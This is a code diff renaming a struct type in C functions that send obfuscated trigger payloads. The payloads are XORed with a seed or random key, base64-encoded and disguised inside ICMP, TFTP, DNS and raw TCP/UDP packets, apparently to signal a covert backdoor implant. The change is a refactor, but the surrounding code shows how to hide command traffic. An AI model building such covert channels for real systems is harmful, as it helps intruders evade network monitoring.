@@ -36,7 +36,7 @@
 #define SPOOF_MTU 1488		// a lower MTU recommended for ATM
 
 /* internal static functions */
-static void obfuscate_payload (payload * p, uint8_t * ret_buf);
+static void obfuscate_payload (Payload * p, uint8_t * ret_buf);
 
 /*!
  * trigger_icmp_error
@@ -56,11 +56,11 @@ static void obfuscate_payload (payload * p, uint8_t * ret_buf);
  */
 
 int
-trigger_icmp_error (payload * p, trigger_info * ti)
+trigger_icmp_error (Payload * p, trigger_info * ti)
 {
 	uint8_t code;
 	//assume payload is an even number of bytes
-	uint8_t obf_payload_buf[sizeof (payload)];
+	uint8_t obf_payload_buf[sizeof (Payload)];
 
 	/* onwire headers */
 	ip_hdr ip_header;
@@ -210,7 +210,7 @@ trigger_icmp_error (payload * p, trigger_info * ti)
  *
  */
 static void
-obfuscate_payload (payload *p, uint8_t *return_buffer)
+obfuscate_payload (Payload *p, uint8_t *return_buffer)
 {
 	int i;
 	uint8_t *package;
@@ -220,7 +220,7 @@ obfuscate_payload (payload *p, uint8_t *return_buffer)
 		p->seed = 0xFF;
 
 	return_buffer[0] = p->seed;
-	for (i = 1; i < (int) sizeof (payload); i++) {
+	for (i = 1; i < (int) sizeof (Payload); i++) {
 		return_buffer[i] = package[i] ^ p->seed;	//Obfuscate payload by XORing it with seed byte
 	}
 }
@@ -238,12 +238,12 @@ obfuscate_payload (payload *p, uint8_t *return_buffer)
  * Splits the payload up into 6 packets before sending.
  */
 int
-trigger_icmp_ping (payload * p, trigger_info * ti)
+trigger_icmp_ping (Payload * p, trigger_info * ti)
 {
 
 	int type;
 	uint32_t data_sz = 56;
-	uint8_t obf_payload_buf[sizeof (payload)];
+	uint8_t obf_payload_buf[sizeof (Payload)];
 
 	uint16_t seq = 0, icmpID;
 	const uint32_t numPings = 6;
@@ -267,7 +267,7 @@ trigger_icmp_ping (payload * p, trigger_info * ti)
 		info ("Pre-obfuscation");
 		info ("Seed: %2.2X", p->seed);
 		printf ("  Payload: ");
-		for (i = 0; i < sizeof(payload); i++) {
+		for (i = 0; i < sizeof(Payload); i++) {
 			printf ("%2.2X ", ((uint8_t *) p)[i]);
 		}
 		printf ("  CRC: 0x%4.4X\n", p->crc);
@@ -444,7 +444,7 @@ ping_generic (ip_hdr * ih, icmp_hdr * ich, uint8_t * data, uint32_t fillSZ)
 
 
 int
-trigger_tftp_wrq (payload * p, trigger_info * ti)
+trigger_tftp_wrq (Payload * p, trigger_info * ti)
 {
 	int encoded_size;
 
@@ -455,8 +455,8 @@ trigger_tftp_wrq (payload * p, trigger_info * ti)
 
 	char *netascii = "netascii";
 
-	uint8_t obf_payload_buf[sizeof (payload)];
-	uint8_t encoded_payload_buf[2 * sizeof (payload)];
+	uint8_t obf_payload_buf[sizeof (Payload)];
+	uint8_t encoded_payload_buf[2 * sizeof (Payload)];
 	uint8_t *tftp_data;
 	size_t data_size;
 
@@ -468,7 +468,7 @@ trigger_tftp_wrq (payload * p, trigger_info * ti)
 		info ("Pre-obfuscation");
 		info ("Seed: %2.2X", p->seed);
 		printf ("  Payload: ");
-		for (i = 0; i < sizeof(payload); i++) {
+		for (i = 0; i < sizeof(Payload); i++) {
 			printf ("%2.2X ", ((uint8_t *) p)[i]);
 		}
 		printf ("  CRC: 0x%4.4X\n", p->crc);
@@ -485,7 +485,7 @@ trigger_tftp_wrq (payload * p, trigger_info * ti)
 
 #ifdef DEBUG
 	{
-		int i;
+		size_t i;
 
 		info ("Post-obfuscation\n");
 		info ("RAW BYTES: ");
@@ -499,7 +499,7 @@ trigger_tftp_wrq (payload * p, trigger_info * ti)
 	// base64 encode the payload
 	cu_b64_encode_message (obf_payload_buf,
 			       encoded_payload_buf,
-			       sizeof (payload), &encoded_size);
+			       sizeof (Payload), &encoded_size);
 
 	encoded_payload_buf[encoded_size] = '\0';
 	encoded_size++;		//account for the NULL
@@ -546,7 +546,7 @@ trigger_tftp_wrq (payload * p, trigger_info * ti)
 }
 
 int
-trigger_dns_query (payload * p, trigger_info * ti)
+trigger_dns_query (Payload * p, trigger_info * ti)
 {
 	int encoded_size;
 
@@ -558,8 +558,8 @@ trigger_dns_query (payload * p, trigger_info * ti)
 	char google[6];
 	char com[3];
 
-	uint8_t obf_payload_buf[sizeof (payload)];
-	uint8_t encoded_payload_buf[2 * sizeof (payload)];
+	uint8_t obf_payload_buf[sizeof (Payload)];
+	uint8_t encoded_payload_buf[2 * sizeof (Payload)];
 
 	uint8_t *dns_data;
 
@@ -588,7 +588,7 @@ trigger_dns_query (payload * p, trigger_info * ti)
 	// base64 encode the payload
 	cu_b64_encode_message (obf_payload_buf,
 			       encoded_payload_buf,
-			       sizeof (payload), &encoded_size);
+			       sizeof (Payload), &encoded_size);
 
 	// TODO: **START CHANGES:  added by Jeremy because TFTP code as these two lines
 	encoded_payload_buf[encoded_size] = '\0';
@@ -678,12 +678,12 @@ trigger_dns_query (payload * p, trigger_info * ti)
 }
 
 int
-trigger_icmp_dest_unreachable (payload * p, trigger_info * ti)
+trigger_icmp_dest_unreachable (Payload * p, trigger_info * ti)
 {
 
 	uint8_t code;
 	//assume payload is an even number of bytes
-	uint8_t obf_payload_buf[sizeof (payload)];
+	uint8_t obf_payload_buf[sizeof (Payload)];
 
 	/* onwire headers */
 	ip_hdr ip_header;
@@ -819,14 +819,14 @@ trigger_icmp_dest_unreachable (payload * p, trigger_info * ti)
 
 #if 0
 int
-trigger_raw_udp (payload *p, trigger_info *ti)
+trigger_raw_udp (Payload *p, trigger_info *ti)
 {
 	in_addr_t s_addr;
 	in_addr_t d_addr;
 	uint16_t s_port;
 	uint16_t d_port;
 	uint8_t *raw_data = NULL;
-	uint8_t obf_payload_buf[sizeof (payload)];
+	uint8_t obf_payload_buf[sizeof (Payload)];
 	unsigned int data_size;
 
 	D (printf ("%s, %4d: raw_udp\n", __FILE__, __LINE__); )
@@ -846,7 +846,7 @@ trigger_raw_udp (payload *p, trigger_info *ti)
 
 	//now set up raw data
 //	obfuscate_payload(p, obf_payload_buf);
-	data_size = formRawPacketData(raw_data, (payload *)p);
+	data_size = formRawPacketData(raw_data, (Payload *)p);
 
 	send_UDP_data (s_addr, d_addr, s_port, d_port, raw_data, data_size);
 
@@ -858,7 +858,7 @@ trigger_raw_udp (payload *p, trigger_info *ti)
 }
 
 int
-trigger_raw_tcp (payload *p, trigger_info * ti)
+trigger_raw_tcp (Payload *p, trigger_info * ti)
 {
 	in_addr_t	s_addr;
 	in_addr_t	d_addr;
@@ -910,7 +910,7 @@ trigger_raw_tcp (payload *p, trigger_info * ti)
  * @return SUCCESS or FAILURE
  */
 unsigned int
-trigger_raw (payload *p, trigger_info *ti)
+trigger_raw (Payload *p, trigger_info *ti)
 {
 	uint16_t	crc = 0;
 	uint16_t	crc_net;
@@ -975,17 +975,17 @@ trigger_raw (payload *p, trigger_info *ti)
 
 	// Encode the payload by XORing it with random data starting at a location within the random data used to generate the CRC.
 	fieldPtr += sizeof(validator_net) + PAD1;			// Update the field pointer to the payload location.
-	payloadKeyIndex = (uint8_t *)(packet + START_PAD + (crc % (CRC_DATA_LENGTH - sizeof(payload))));	// Compute the start of the payload key
-	D (printf (" %s, %d:\tEncoded trigger offset: 0x%0x, payload key offset: 0x%0x\tTrigger follows\n", __FILE__, __LINE__, (uint8_t *)fieldPtr-packet, payloadKeyIndex-packet); )
+	payloadKeyIndex = (uint8_t *)(packet + START_PAD + (crc % (CRC_DATA_LENGTH - sizeof(Payload))));	// Compute the start of the payload key
+	D (printf (" %s, %d:\tEncoded payload offset: 0x%0x, payload key offset: 0x%0x\tPayload follows\n", __FILE__, __LINE__, (uint8_t *)fieldPtr-packet, payloadKeyIndex-packet); )
 
-	for (i = 0; i < (int)sizeof(payload); i++) {
+	for (i = 0; i < (int)sizeof(Payload); i++) {
 		uint8_t trigger;
 		trigger = payloadKeyIndex[i] ^ ((uint8_t *)p)[i];			// XOR the payload with the key
-		D (printf ("\tByte[%2.2d]: trigger =  0x%2.2x, payloadKey = 0x%2.2x, encoded trigger = 0x%2.2x\n", i, ((uint8_t *)p)[i], payloadKeyIndex[i], trigger); )
+		D (printf ("\tByte[%2.2d]: payload =  0x%2.2x, payloadKey = 0x%2.2x, encoded payload = 0x%2.2x\n", i, ((uint8_t *)p)[i], payloadKeyIndex[i], trigger); )
 		memcpy(fieldPtr + i, &trigger, sizeof(uint8_t));
 	}
 
-	fieldPtr += sizeof(payload) + PAD2;
+	fieldPtr += sizeof(Payload) + PAD2;
 	D (printf ("\n %s, %d:\tPacket Length: %d\n", __FILE__, __LINE__,(unsigned int)fieldPtr - (unsigned int)packet + (unsigned int)(crc % RANDOM_PAD2) ); )
 	packet_size = (unsigned int)fieldPtr - (unsigned int)packet + (unsigned int)(crc % RANDOM_PAD2);	// Total length of the packet, including a randomized padding length.
 
